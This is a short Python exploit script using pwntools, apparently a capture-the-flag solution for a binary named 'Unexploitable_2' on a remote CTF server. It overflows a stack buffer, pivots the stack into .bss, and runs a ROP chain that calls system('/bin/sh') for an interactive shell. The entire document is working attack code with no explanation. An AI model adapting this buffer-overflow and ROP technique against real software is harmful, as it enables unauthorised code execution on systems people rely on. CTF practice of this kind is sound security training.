from pwn import *
r=remote("ctf.j0n9hyun.xyz", 3029)
prdi=0x0000000000400773
leave=0x40070b
bss=0x601000+0x9d0
system=0x0000000000400684
#r=process("./Unexploitable_2")
b=ELF("./Unexploitable_2")
context.log_level='debug'

pay=b'1'*0x10
pay+=p64(bss+0x10)
pay+=p64(b.symbols['main']+98)
pause()
r.sendline(pay)

pay2='/bin/sh\x00'.encode()
pay2+=b'x'*0x10
pay2+=p64(prdi)
pay2+=p64(bss)
pay2+=p64(b.plt['system'])
r.sendline(pay2)

r.interactive()
